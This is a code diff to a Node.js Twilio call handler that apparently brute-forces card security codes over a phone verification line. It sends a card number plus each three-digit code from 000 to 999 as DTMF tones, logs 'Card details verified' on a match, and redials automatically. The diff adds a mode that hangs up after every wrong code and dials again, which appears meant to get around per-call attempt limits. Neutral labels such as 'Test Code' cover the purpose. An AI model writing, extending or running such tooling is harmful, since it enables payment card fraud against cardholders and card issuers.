@@ -106,7 +106,7 @@ export const handleTryCode = async (req, res) => {
 
   const twiml = new twilio.twiml.VoiceResponse();
 
-  const BATCH_SIZE = 50;
+  const BATCH_SIZE = parseInt(process.env.BATCH_SIZE) || 1;
   const endCodeNum = Math.min(currentCodeNum + BATCH_SIZE, 1000);
 
   let lastCodeInBatch = '';
@@ -124,6 +124,8 @@ export const handleTryCode = async (req, res) => {
       batchLogs.push(`DTMF Sent: ${baseCard}:${codeStr}`);
       if (isMatch) {
         batchLogs.push(`✅🎉 Target Test Code matched: ${codeStr}! Card details verified.`);
+      } else if (BATCH_SIZE === 1) {
+        batchLogs.push(`❌IVR responded: Incorrect target code for ${codeStr}. Disconnecting call immediately to dial next code...`);
       }
       const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 5;
       twiml.pause({ length: waitSeconds });
@@ -132,7 +134,7 @@ export const handleTryCode = async (req, res) => {
       if (isMatch) {
         batchLogs.push(`✅🎉 Target Test Code matched: ${codeStr}! Card details verified.`);
       } else {
-        batchLogs.push(`❌IVR says "Incorrect Test Code" for ${codeStr}. Trying next...`);
+        batchLogs.push(`❌IVR responded: Incorrect Test Code for ${codeStr}. Disconnecting call to start next call...`);
       }
       batchLogs.push(`DTMF Sent: ${baseCard}:${codeStr}`);
       twiml.pause({ length: 2 });
@@ -141,21 +143,26 @@ export const handleTryCode = async (req, res) => {
 
     if (isMatch) {
       reachedWinner = true;
-      break; // Stop adding more codes to TwiML once target code is reached!
+      break;
     }
   }
 
   await AttemptModel.addLogs(attemptId, batchLogs);
 
-  // Update the DB so the frontend shows the current Test code progressing
-  await AttemptModel.updateTestValue(attemptId, `${baseCard}:${lastCodeInBatch}`);
+  // Determine next code to prepare for next call
+  const nextTestCode = (endCodeNum).toString().padStart(3, '0');
+  await AttemptModel.updateTestValue(attemptId, `${baseCard}:${nextTestCode}`);
 
   if (reachedWinner) {
-    console.log(`[handleTryCode] Target winner code ${targetWinner} reached in TwiML. Hanging up call immediately.`);
+    console.log(`[handleTryCode] Target winner code ${targetWinner} matched. Hanging up call immediately.`);
     twiml.pause({ length: 2 });
-    twiml.hangup(); // Stop immediately, do NOT redirect to next batch!
+    twiml.hangup();
+  } else if (BATCH_SIZE === 1) {
+    // Single-Code Per Call strategy: disconnect call immediately so next call is placed for next code
+    console.log(`[handleTryCode] Code ${lastCodeInBatch} incorrect. Disconnecting call immediately to dial next code.`);
+    twiml.pause({ length: 2 });
+    twiml.hangup();
   } else {
-    const nextTestCode = endCodeNum.toString().padStart(3, '0');
     twiml.pause({ length: 1 });
     const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
     twiml.redirect({ method: 'POST' }, `${host}/api/call/try/${attemptId}?currentTestCode=${nextTestCode}&isFirst=false`);
@@ -224,7 +231,7 @@ export const handleStatusCallback = async (req, res) => {
         const foundWinner = attempt && attempt.result_details && attempt.result_details.winner;
 
         if (attempt && attempt.target_test_code && !foundWinner && attempt.status !== 'failed' && attempt.status !== 'completed') {
-          await AttemptModel.addLog(attemptId, 'Call completed prematurely at Twilio limit without reaching target. Auto-resuming...');
+          await AttemptModel.addLog(attemptId, 'Call ended after test code attempt. Auto-resuming next call for next code...');
           await AttemptModel.updateAttemptStatus(attemptId, 'queued', duration, { twilioStatus: CallStatus });
         } else if (attempt && attempt.status !== 'failed' && attempt.status !== 'completed') {
           await AttemptModel.updateAttemptStatus(attemptId, 'completed', duration, { twilioStatus: CallStatus });
